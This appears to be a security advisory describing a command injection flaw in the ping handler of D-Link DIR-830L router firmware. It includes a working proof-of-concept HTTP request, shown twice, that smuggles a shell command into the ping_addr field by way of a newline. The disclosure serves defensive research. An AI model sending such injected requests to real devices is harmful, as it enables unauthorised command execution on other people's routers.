# Summary
There is a command injection vulnerability in `ncc2` binary file of D-Link DIR830LA1_FW100B07, which can lead to arbitrary command execution.

Fimware download link : https://legacyfiles.us.dlink.com/DIR-830L/REVA/FIRMWARE/DIR-830L_REVA_FIRMWARE_1.00B07.ZIP

Affected component is `pingV4Msg`, which is `sub_4A3768` decompiled by IDA and `ping.ccp`.

Notice: it also exists in **HotFix** version!

# Details
The same as `cancelPing`, `pingV4Msg` is also called in `callback_ccp_ping`:
![image](https://github.com/user-attachments/assets/b354f269-3626-4b16-ae04-716d88113520)

Use IDA to decompile `sub_4A3768`:
![image](https://github.com/user-attachments/assets/cec72a6c-8309-4e67-ae8f-2217d1e1eebc)

Line 24 use `snprintf` to concatenate `v8` into `v16`, and line 25 use `popen`.
If we can bypass
```
if ( v7 && hasInjectionString(v7) != 1 && (sub_4A3040(v8) || !sub_4A33CC(v8, v14)) && strcmp(v8, "localhost") )
```
we can inject our command.

Function `sub_4A3040`:
![image](https://github.com/user-attachments/assets/89d6a851-217d-41e4-8d11-2140a4090284)

We can use `%0a` to bypass `regcomp`.

PoC:
```
POST /ping.ccp HTTP/1.1

Host: 192.168.0.1

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: http://192.168.0.1/info/Login.html

Connection: close

Cookie: uid=HIVZV0Zk1C

Upgrade-Insecure-Requests: 1

If-Modified-Since: Fri, 07 Nov 2014 06:35:31 GMT

Content-Type: application/x-www-form-urlencoded

Content-Length: 63



ccp_act=pingV4Msg&ping_addr=127.0.0.1%0abusybox >/www/poc3.html
```
![image](https://github.com/user-attachments/assets/a4de7616-57dc-4595-862c-4b0cfd726a8f)

After sending packet, visit `/poc3.html` to see the result:
![image](https://github.com/user-attachments/assets/8beb7944-4649-4673-ae15-3f005bb2fb16)

# PoC
(**Login** first to get your cookie)
```html
POST /ping.ccp HTTP/1.1

Host: 192.168.0.1

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: http://192.168.0.1/info/Login.html

Connection: close

Cookie: uid=HIVZV0Zk1C

Upgrade-Insecure-Requests: 1

If-Modified-Since: Fri, 07 Nov 2014 06:35:31 GMT

Content-Type: application/x-www-form-urlencoded

Content-Length: 63



ccp_act=pingV4Msg&ping_addr=127.0.0.1%0abusybox >/www/poc3.html
```
![image](https://github.com/user-attachments/assets/a4de7616-57dc-4595-862c-4b0cfd726a8f)
![image](https://github.com/user-attachments/assets/8beb7944-4649-4673-ae15-3f005bb2fb16)

